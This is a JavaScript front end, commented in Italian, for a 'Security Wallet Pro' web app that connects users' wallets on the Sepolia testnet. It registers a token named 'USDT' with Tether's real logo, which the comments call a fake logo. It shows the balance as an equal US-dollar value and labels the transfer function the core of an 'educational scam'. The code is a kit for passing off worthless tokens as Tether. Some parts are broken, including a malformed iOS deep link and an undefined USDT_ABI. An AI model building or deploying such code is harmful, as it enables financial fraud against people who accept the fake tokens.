// app.js – Security Wallet Pro v3 Universale e Professionale

// Assicurati che Ethers.js v6 sia caricato nell'HTML prima di questo script
// (<script src="cdn.ethers.io"></script>)

let provider;
let signer;
let account;
let usdt;

const USDT_ADDRESS = "0x1eB20Afd64393EbD94EB77FC59a6a24a07f8A93D";
const USDT_DECIMALS = 6;
const SEPOLIA_CHAIN_ID_HEX = "0xaa36a7"; // Sepolia in hex
const SEPOLIA_CHAIN_ID_DEC = 11155111; // Sepolia in decimale

// 1. Funzione per saltare dal browser normale all'App Wallet (Deep Linking)
function openInWallet() {
    // Controlla il tipo di dispositivo per il deep link ottimale
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    const dappUrl = window.location.href;

    if (/android/i.test(userAgent)) {
        window.location.href = "intent://" + dappUrl.replace("https://", "") + "#Intent;package=com.metamask.android;scheme=https;end";
    } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        // iOS Deep Link (funziona per MetaMask, Trust Wallet, Coinbase)
        window.location.href = `metamask.app.link{dappUrl.replace("https://", "")}`;
    } else {
        alert("Scansiona il QR Code con il tuo wallet mobile o usa un PC.");
    }
}

// 2. Connessione Universale e Switch Rete Automatico
async function connectWallet() {
  // EIP-1193 standard provider detection (MetaMask, Trust, Coinbase)
  if (typeof window.ethereum === 'undefined') {
    alert("Per favore, apri questa pagina dal browser interno del tuo Wallet (MetaMask, Trust Wallet o Coinbase)");
    return;
  }

  try {
    provider = new ethers.BrowserProvider(window.ethereum);
    
    // Richiesta Account
    const accs = await provider.send("eth_requestAccounts", []);
    account = accs[0];

    // Controllo e Switch Rete Automatico
    const network = await provider.getNetwork();
    
    if (network.chainId !== SEPOLIA_CHAIN_ID_DEC) {
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: SEPOLIA_CHAIN_ID_HEX }]
        });
        // Ricarica per applicare il cambio se necessario
        window.location.reload(); 
      } catch (err) {
        if (err.code === 4902) {
            alert("Aggiungi la rete Sepolia al tuo wallet per continuare.");
        }
      }
    }

    signer = await provider.getSigner();
    
    // Aggiorna UI
    document.getElementById("wallet").innerText = account.slice(0, 6) + "..." + account.slice(-4);
    document.getElementById("status").innerText = "● Connesso (Sepolia)";
    document.getElementById("status").style.color = "#26a17b";
    // Nascondi il pulsante deep link quando si è connessi nel browser interno
    document.getElementById("btnMobileOpen").style.display = "none"; 

    usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
    updateUI();

  } catch (error) {
    console.error("Errore connessione:", error);
    alert("Connessione rifiutata.");
  }
}

// 3. Funzione per aggiungere il LOGO finto Tether al Wallet
async function addTokenToWallet() {
    if (!window.ethereum) return;
    try {
        await window.ethereum.request({
            method: 'wallet_watchAsset',
            params: {
                type: 'ERC20',
                options: {
                    address: USDT_ADDRESS,
                    symbol: 'USDT', 
                    decimals: USDT_DECIMALS,
                    image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                },
            },
        });
    } catch (error) {
        console.error(error);
    }
}

// 4. Aggiornamento Saldo
async function updateUI() {
  if (!usdt || !account) return;
  const raw = await usdt.balanceOf(account);
  const balance = Number(ethers.formatUnits(raw, USDT_DECIMALS));

  document.getElementById("balance").innerText = balance.toLocaleString() + " USDT";
  // Questo valore $0.00 USD apparirà solo dopo aver creato la pool di liquidità
  document.getElementById("usdValue").innerText = "$" + balance.toLocaleString() + " USD"; 
}

// 5. Invio Token (Funzione Principale della Truffa Didattica)
async function sendUSDT() {
  const to = document.getElementById("to").value;
  const amount = document.getElementById("amount").value;

  if (!ethers.isAddress(to)) {
    alert("Indirizzo non valido");
    return;
  }

  try {
    const value = ethers.parseUnits(amount, USDT_DECIMALS);
    const tx = await usdt.transfer(to, value);
    alert("Transazione inviata! Attendi conferma...");
    await tx.wait();
    alert("✅ Invio completato!");
    updateUI();
  } catch (err) {
    alert("Errore durante l'invio. Verifica di avere abbastanza ETH per il gas e il saldo USDT.");
  }
}

// Aggiungi un listener per nascondere il pulsante deep-link se siamo già in un wallet browser
window.addEventListener('load', () => {
    if (window.ethereum) {
        document.getElementById("btnMobileOpen").style.display = "none";
        // Opzionale: Connetti automaticamente se l'utente ha già autorizzato
        // connectWallet(); 
    }
});
